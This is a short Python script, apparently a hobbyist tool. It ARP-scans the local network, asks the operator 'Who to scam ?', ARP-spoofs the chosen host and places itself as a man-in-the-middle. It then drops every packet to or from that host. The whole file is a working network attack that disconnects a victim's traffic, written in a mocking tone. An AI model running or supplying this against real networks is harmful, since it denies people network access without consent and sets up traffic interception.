from nifty.network.arp.spoof import ARPSpoofer
from nifty.network.arp.neighbourhood import arp_scan
from nifty.network.arp.spoof import MITM
from netfilterqueue import Packet
from scapy.all import IP

targets = arp_scan()
for i in range(len(targets)):
    print(f"{i} - {targets[i]}")

ans = int(input("Who to scam ? "))
target = targets[ans].ip

a = ARPSpoofer(target)

a.start()

def bully(pkt: Packet):
    global target
    spkt = IP(pkt.get_payload())
    ip_src=spkt[IP].src
    ip_dst=spkt[IP].dst
    if (ip_src == target or ip_dst == target):
        print("Yeeted ", pkt)
        pkt.drop()
    else:
        pkt.accept()


MITM.start(bully)